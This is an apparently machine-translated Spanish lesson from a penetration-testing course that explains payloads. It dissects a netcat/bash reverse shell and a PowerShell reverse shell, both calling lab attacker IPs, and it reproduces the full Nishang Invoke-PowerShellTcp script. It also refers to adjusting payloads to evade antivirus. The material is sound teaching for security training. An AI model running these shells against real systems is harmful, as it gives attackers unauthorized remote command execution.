# Introducción a las cargas útiles

`Have you ever sent an email or text to someone?`

La mayoría de nosotros probablemente lo hemos hecho. El mensaje que enviamos en un correo electrónico o mensaje de texto es la carga útil del paquete, ya que se envía a través de Internet. En la computación, la carga útil es el mensaje previsto. En seguridad de la información, la carga útil es el comando y/o código que explota la vulnerabilidad en un sistema operativo y/o aplicación. La carga útil es el comando y/o código que realiza la acción maliciosa desde una perspectiva defensiva. Como vimos en la sección de Shells inverso, Windows Defender detuvo la ejecución de nuestra carga útil de PowerShell porque se consideraba un código malicioso.

Tenga en cuenta que cuando entregamos y ejecutamos las cargas útiles, al igual que cualquier otro programa, damos las instrucciones de la computadora de destino sobre lo que necesita hacer. Los términos "malware" y "código malicioso" romantizan el proceso y lo hacen más misterioso de lo que es. Cada vez que trabajamos con las cargas útiles, nos desafiemos a nosotros mismos para explorar lo que realmente están haciendo el código y los comandos. Comenzaremos este proceso descomponiendo las frases que trabajamos anteriormente:

---

# **Frases examinadas**

### **Netcat/bash shell inverso de un enlace**

Introducción a las cargas útiles

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

```

Los comandos anteriores conforman una línea de una sola emitida en un sistema de Linux para servir un shell de bash en un socket de red utilizando un oyente de NetCat. Utilizamos esto anteriormente en la sección Bind Shells. A menudo es copiado y pegado, pero no a menudo se entiende. Desglosemos cada porción de la línea de una sola:

### **Eliminar /tmp /f**

Introducción a las cargas útiles

```
rm -f /tmp/f;

```

Elimina el`/tmp/f`archivo si existe,`-f`causas`rm`para ignorar archivos inexistentes. El semicolón (`;`) se usa para ejecutar el comando secuencialmente.

### **Hacer una tubería con nombre**

Introducción a las cargas útiles

```
mkfifo /tmp/f;

```

Hacer un[FIFO llamado Pipe File](https://man7.org/linux/man-pages/man7/fifo.7.html)en la ubicación especificada. En este caso, /TMP /F es el archivo de tubería llamado FIFO, el semi-colon (`;`) se usa para ejecutar el comando secuencialmente.

### **Redirección de salida**

Introducción a las cargas útiles

```
cat /tmp/f |

```

Concatena el archivo de tubería con nombre fifo /tmp /f, la tubería (`|`) conecta la salida estándar de CAT /TMP /F a la entrada estándar del comando que viene después de la tubería (`|`).

### **Establecer opciones de shell**

Introducción a las cargas útiles

```
/bin/bash -i 2>&1 |

```

Especifica el intérprete de lenguaje de comando usando el`-i`Opción para garantizar que el shell sea interactivo.`2>&1`Asegura el flujo de datos de error estándar (`2`) `&`flujo de datos de salida estándar (`1`) se redirigen al comando que sigue a la tubería (`|`).

### **Abra una conexión con NetCat**

Introducción a las cargas útiles

```
nc 10.10.14.12 7777 > /tmp/f

```

Utiliza NetCat para enviar una conexión a nuestro host de ataque`10.10.14.12`escuchando en el puerto`7777`. La salida será redirigida (`>`) a /tmp /f, servir el shell de bash a nuestro oyente de Netcat que espera cuando se ejecuta el comando de una línea de una sola línea

---

# **PowerShell One-Liner explicó**

Las conchas y cargas útiles que elegimos usar en gran medida dependen del sistema operativo que estamos atacando. Tenga en cuenta esto mientras continuamos a lo largo del módulo. Fuimos testigos de esto en la sección de conchas inversas estableciendo un shell inverso con un sistema de Windows usando PowerShell. Desglosemos la línea de una sola que usamos:

### **PowerShell de una línea**

Introducción a las cargas útiles

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

Diseccionaremos el comando PowerShell bastante grande que puede ver anteriormente. Puede parecer mucho, pero con suerte, podemos desmitificarlo un poco.

### **Llamar a PowerShell**

Introducción a las cargas útiles

```
powershell -nop -c

```

Ejecutar`powershell.exe`sin perfil (`nop`) y ejecuta el bloque de comando/script (`-c`) contenido en las citas. Este comando en particular se emite dentro de Command-Prompt, por lo que PowerShell está al comienzo del comando. Es bueno saber cómo hacer esto si descubrimos una vulnerabilidad de ejecución de código remoto que nos permite ejecutar comandos directamente en`cmd.exe`.

### **Atar un enchufe**

Introducción a las cargas útiles

```
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);

```

Establece/evalúa la variable`$client`igual a (`=`) el`New-Object`cmdlet, que crea una instancia de la`System.Net.Sockets.TCPClient`Objeto .NET Framework. El objeto .NET Framework se conectará con el socket TCP que se enumera en los paréntesis`(10.10.14.158,443)`. El semicolón (`;`) asegura que los comandos y el código se ejecuten secuencialmente.

### **Configuración de la transmisión de comando**

Introducción a las cargas útiles

```
$stream = $client.GetStream();

```

Establece/evalúa la variable`$stream`igual a (`=`) el`$client`variable y el método de .net framework llamado[Gettream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0)Eso facilita las comunicaciones de la red. El semicolón (`;`) asegura que los comandos y el código se ejecuten secuencialmente.

### **Transmisión de bytes vacío**

Introducción a las cargas útiles

```
[byte[]]$bytes = 0..65535|%{0};

```

Crea una matriz tipo byte (`[]`) llamado`$bytes`Eso devuelve 65,535 ceros como los valores en la matriz. Esta es esencialmente una transmisión de bytes vacía que se dirigirá al oyente TCP en un cuadro de ataque que espera una conexión.

### **Parámetros de transmisión**

Introducción a las cargas útiles

```
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

```

Comienza`while`bucle que contiene el`$i`variable establecido igual a (`=`) el marco .net[Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) método. Los parámetros: búfer (`$bytes`), compensar (`0`) y contar (`$bytes.Length`) se definen dentro de los paréntesis del método.

### **Establecer la codificación de byte**

Introducción a las cargas útiles

```
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);

```

Establece/evalúa la variable`$data`igual a (`=`) un[Ascii](https://en.wikipedia.org/wiki/ASCII)Codificación de la clase de marco .NET que se utilizará junto con el`GetString`método para codificar la secuencia de byte (`$bytes`) en ascii. En resumen, lo que escribimos no se transmitirá y se recibirá como bits vacíos, sino que se codificará como texto ASCII. El semicolón (`;`) asegura que los comandos y el código se ejecuten secuencialmente.

### **Invoca-Expresión**

Introducción a las cargas útiles

```
$sendback = (iex $data 2>&1 | Out-String );

```

Establece/evalúa la variable`$sendback`igual a (`=`) el invoke-expresión (`iex`) cmdlet contra el`$data`variable, luego redirige el error estándar (`2>`) `&`Salida estándar (`1`) a través de una tubería (`|`) hacia`Out-String`Cmdlet que convierte los objetos de entrada en cadenas. Debido a que se utiliza la expresión de invoques, todo lo que se almacena en $ datos se ejecutará en la computadora local. El semicolón (`;`) asegura que los comandos y el código se ejecuten secuencialmente.

### **Mostrar directorio de trabajo**

Introducción a las cargas útiles

```
$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';

```

Establece/evalúa la variable`$sendback2`igual a (`=`) el`$sendback`variable plus (`+`) la cadena ps (`'PS'`) más`+`camino hacia el directorio de trabajo (`(pwd).path`) Plus (`+`) la cadena`'> '`. Esto dará como resultado que el indicador sea PS C: \ WorkingDirectoryOfMachine>. El semicolón (`;`) asegura que los comandos y el código se ejecuten secuencialmente. Recuerde que el operador+ en la programación combina cadenas cuando los valores numéricos no están en uso, con la excepción de ciertos idiomas como C y C ++ donde se necesitaría una función.

### **Conjuntos SendByte**

Introducción a las cargas útiles

```
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}

```

Establece/evalúa la variable`$sendbyte`igual a (`=`) La transmisión de byte codificada ASCII que usará un cliente TCP para iniciar una sesión de PowerShell con un oyente NetCat que se ejecuta en el cuadro de ataque.

### **Terminar la conexión TCP**

Introducción a las cargas útiles

```
$client.Close()"

```

Este es el[TCPClient.CLOSE](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0)Método que se utilizará cuando se termine la conexión.

La línea única que acabamos de examinar juntos también se puede ejecutar en forma de un script de PowerShell (`.ps1`). Podemos ver un ejemplo de esto al ver el código fuente a continuación. Este código fuente es parte del[nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)proyecto:

Código:powershell

```powershell
function Invoke-PowerShellTcp
{
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch.
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
the given IP and port.
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port.
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    try
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target."
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

```

---

# **Las cargas útiles toman diferentes formas y formularios**

Comprender qué están haciendo diferentes tipos de cargas útiles puede ayudarnos a comprender por qué AV nos está bloqueando la ejecución y nos da una idea de lo que podríamos necesitar cambiar en nuestro código para evitar las restricciones. Esto es algo que exploraremos más en este módulo. Por ahora, comprenda que las cargas útiles que usamos para obtener un shell en un sistema estarán determinados en gran medida por qué lenguajes de intérpretes de SO, Shell e incluso los lenguajes de programación están presentes en el objetivo.

No todas las cargas útiles son frases e implementadas manualmente como las que estudiamos en esta sección. Algunos se generan utilizando marcos de ataque automatizados e implementados como un ataque preenvasado/automatizado para obtener un shell. Como en el muy poderoso`Metasploit-framework`, con el que trabajaremos en la siguiente sección.